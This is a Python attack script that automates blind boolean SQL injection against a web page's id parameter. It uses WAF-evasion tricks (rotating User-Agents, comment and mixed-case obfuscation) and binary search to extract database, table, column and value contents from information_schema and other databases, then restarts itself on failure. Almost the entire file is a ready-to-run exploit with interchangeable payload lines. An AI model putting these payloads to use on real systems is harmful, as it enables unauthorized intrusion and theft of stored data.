import requests
import random
import urllib.parse as urltools
import string
import os

"Method to clear the results"
def clear():
	os.system('clear')

"Method to get an ordered set of ASCII characters" 
def GetOrderedASCIIChars():
	candidateChars = string.punctuation + string.digits + string.ascii_letters + string.whitespace
	candidateChars = list(candidateChars)
	candidateChars.sort()
	candidateChars = ''.join(candidateChars)
	#Some characters are not acceptable by the database => invalid characters => we remove them from the set of possible characters
	candidateChars = candidateChars.replace('&','').replace('\'','').replace('#','').replace('%','')
	return candidateChars

url = "https://example.com/article"

##To prevent WAF from blocking the request
headers = ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36 OPR/47.0.2631.39', 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.72 Mobile Safari/537.36 OPR/19.0.1340.71596']

Headers = {'User-Agent': headers[random.randint(0,1)]}

tables_nb = 5 #Identified by means of an SQL Injection

new_characters = GetOrderedASCIIChars()

file_name = "data.txt" #File to store the progress
##Code to resume data collecting from where it stopped
file = open(file_name, 'a+') #"a" to append (to create the file in case it does not exist instead of throwing an error) and "+" to enable both read and write modes (to be able to read essentially at this stage)
new_query = file.read().strip()
new_query = list(new_query)
# print(new_query)
# print(new_characters)

##Code to blindly extract data from the database
try:
	while True:
		search_range = new_characters
		position = len(new_query)+1
		while len(search_range) > 0:
			charac = search_range[len(search_range)//2]
			# print(f"testing with {search_range}") #For debugging purposes 

			#=================================================DATABASE GENERAL INFO==============================================
			# #USED TO EXTRACT INFO ABOUT THE DATABASE such as Version, User, etc.
			
			# resp = requests.get(f"{url}?id=1+and+substring((select last_insert_id()),{position},1)='{charac}'", headers=Headers)
			#------------------------------------------------------------------------------------------------------------
			

			#======================================================DATABASES=====================================================
			# #USED TO EXTRACT ALL THE DATABASES NAMES
			
			resp = requests.get(f"{url}?id=1+and+substring((select%20group_concat(distinct table_schema)%20rate%20FrOm/*!information_schema*/.tables),{position},1)='{charac}'", headers=Headers)

			#------------------------------------------------------------------------------------------------------------
			

			#====================================================TABLES==================================================
			# #USED TO EXTRACT ALL THE TABLES FROM A CHOSEN DATABASE, OR ALL(For this, I must remove "where table_schema like ''" in order to retrieve the tables from all dbs)
			# NOTE:the CaSe doesn't matter (lower or upper)
			database_name = 'db_ex'
			# database_name = 'information_schema'

			##THIS IS WORKING TO EXTRACT UP TO 1024 CHARACTERS##
			# resp = requests.get(f"{url}?id=1+and+substring((SeLeCt%20GrOuP_CoNcAt(table_name ORDER BY table_name ASC) %20shepo%20FrOm/*!information_schema*/.tables%20/*!WhErE*/+/*!TaBlE_sChEMa*/+LiKe+'{database_name}'),{position},1)='{charac}';", headers=Headers)
			##END THIS IS WORKING TO EXTRACT UP TO 1024 CHARACTERS##


			##THIS IS WORKING TO EXTRACT ALL TABLES AND COLUMNS##
			# resp = requests.get(f"{url}?id=1 and substring((Select export_set(5,@x:=0,(select count(*)from(information_schema.columns)where(table_schema like '{database_name}')and@x:=export_set(5,export_set(5,@x,table_name,0x2c,2),column_name,0x3a,2)),@x,2)),{position},1)='{charac}'", headers=Headers)
			##END THIS IS WORKING TO EXTRACT ALL TABLES WITH COLUMNS##

			# resp = requests.get(f"{url}?id=1+and+substring((Select export_set(5,@x:=0,(select count(*)from(/*!information_schema*/.tables)where(table_schema like '{database_name}')and@x:=export_set(5,@x,table_name,0x2c,2)),@x,2)),{position},1)='{charac}';", headers = Headers)

			# FOR DEBUGGING PURPOSES #
			# print(resp.content)
			# if charac == 'y':
			# 	exit()
			
			# ------------------------------------------------------------------------------------------------------------


			#====================================================COLUMNS==================================================
			# #USED TO EXTRACT ALL THE COLUMNS FROM A CHOSEN TABLE, OR ALL(For this, I must remove "table_name ='blabla'" (or like 'blalba') in order to retrieve columns from all dbs)
			table_name = 'table_ex'
			
			# resp = requests.get(f"{url}?id=1+and+substring((SeLeCt%20GrOuP_CoNcAt(DiStIncT column_name)%20hiya%20FrOm/*!information_schema*/.columns/*!WhErE*/+/*!TaBlE_name*/='{table_name}'),{position},1)='{charac}'", headers=Headers)
			# resp = requests.get(f"{url}?id=1+and+substring((SeLeCt%20GrOuP_CoNcAt(DiStIncT column_name)%20hiya%20FrOm/*!information_schema*/.columns),{position},1)='{charac}'", headers=Headers)
			 
			# ------------------------------------------------------------------------------------------------------------
			
			#====================================================VALUES===================================================
			# #USED TO EXTRACT VALUES OF THE CHOSEN COLUMN(S)
			column_name = 'column_ex'
			order_by_setting = 'order by [column_to_order_by] DESC OR ASC'

			#QUERY TO EXTRACT VALUE FROM THE *CURRENT* DATABASE 
			# resp = requests.get(f"{url}?id=1+and+substring((SeLeCt%20 id /*!from*/ {table_name}),{position},1) = '{charac}'", headers=Headers) 

			#QUERY TO EXTRACT VALUE FROM *ANOTHER* DATABASE
			# resp = requests.get(f"{url}?id=1+and+substring((SeLeCt%20GrOuP_CoNcAt({column_name}) /*!FrOm*/ {database_name}.{table_name}),{position},1) = '{charac}'", headers=Headers) 

			# ------------------------------------------------------------------------------------------------------------
			
			##Decisions: The set of conditions below determines how the code will know that the value guessed is correct/incorrect based on the response of the web server
			##This depends on the target website
	
			#Examples:
			# if status 200 => correct guess => break and guess next char #ATTENTION: Not always true

		    	#In this script, we consider the following case
		    	#The website returns: 
				#200 status code <=> legitimate request <=> WAF bypassed successfully 
				    #If the guess is Correct: "Example" text is displayed
				    #If the guess is Incorrect: "Example" text is missing from the response
				#406 status code <=> WAF detects the SQL Injection attack
				    #"Not Acceptable" text is displayed
		
			##GUESSING ALGORITHM
			print(f"Testing: {''.join(new_query)+charac}") #For Visualization and Debugging
            
            		#Case 1: WAF Triggered, in which case we stop the code
			if "Not Acceptable" in str(resp.content) : #Status code is 406: Not Acceptable
				print("WAF in the house") #WAF Detected, a bypass must be figured out
				exit() #Stop running the code because WAF will block all requests if it's not bypassed
            
            		#Case 2: WAF Bypassed and the guess is Incorrect, in which case we start running the bruteforce algorithm
			elif resp.status_code==200 and "Example" not in str(resp.content):
				
				##ONLY ONE LINE OF THE LINES BELOW IS TO BE UNCOMMENTED
				
                		#Use the line below this one to extract all databases 
				# resp = requests.get(f"{url}?id=1+and+substring((select%20group_concat(distinct table_schema)%20rate%20FrOm/*!information_schema*/.tables),{position},1)>'{charac}'", headers=Headers)

				#Use the line below this one to extract all columns of a given table
				# resp = requests.get(f"{url}?id=1+and+substring((SeLeCt%20GrOuP_CoNcAt(DiStIncT column_name)%20hiya%20FrOm/*!information_schema*/.columns/*!WhErE*/+/*!TaBlE_name*/='{table_name}'),{position},1)>'{charac}'", headers=Headers)
				
				##Use the line below TO EXTRACT ALL TABLES AND COLUMNS
				# resp = requests.get(f"{url}?id=1 and substring((Select export_set(5,@x:=0,(select count(*)from(information_schema.columns)where(table_schema like '{database_name}')and@x:=export_set(5,export_set(5,@x,table_name,0x2c,2),column_name,0x3a,2)),@x,2)),{position},1)>'{charac}'", headers=Headers)

				#Use the line below to extract all columns of all tables of a given db
				#resp = requests.get(f"{url}?id=1+and+substring((SeLeCt%20GrOuP_CoNcAt(DiStIncT column_name)%20hiya%20FrOm/*!information_schema*/.columns),{position},1)>'{charac}'", headers=Headers)
                
                		##END ONLY ONE LINE OF THE LINES BELOW IS TO BE UNCOMMENTED

				if "Example" not in str(resp.content):
					search_range = search_range[:len(search_range)//2]
					# print(f"keep the part on the left, new search_range is: {search_range}") #For debugging purposes 
					continue
				# else
				search_range = search_range[len(search_range)//2:]
				# print(f"keep the part on the right, new search_range is: {search_range}") #For debugging purposes 
				continue

			#Case 2: WAF Bypassed and the guess is Correct, in which case we note the character revealed
			elif resp.status_code==200 and "Example" in str(resp.content):
				# print("found") #For debugging purposes
				new_query.append(charac) #Append the character guessed to the list of data collected
				break #Start guessing the next character

            		#Case 3: Unknown response (We never know what might happen XD)
			else:
				print("Unexpected Error Occurred!")
				print(resp.url) #For debugging purposes
				print(str(resp.content)) #For debugging purposes

			##END GUESSING ALGORITHM

#In case of a failure or the code stops running, write the progress to the file and restart the program. This is to automate the attack, to avoid manual restarting
except:
	with open(file_name, 'w') as file:
		new_query = ''.join(new_query)
		file.write(new_query)
	os.system("python script.py")
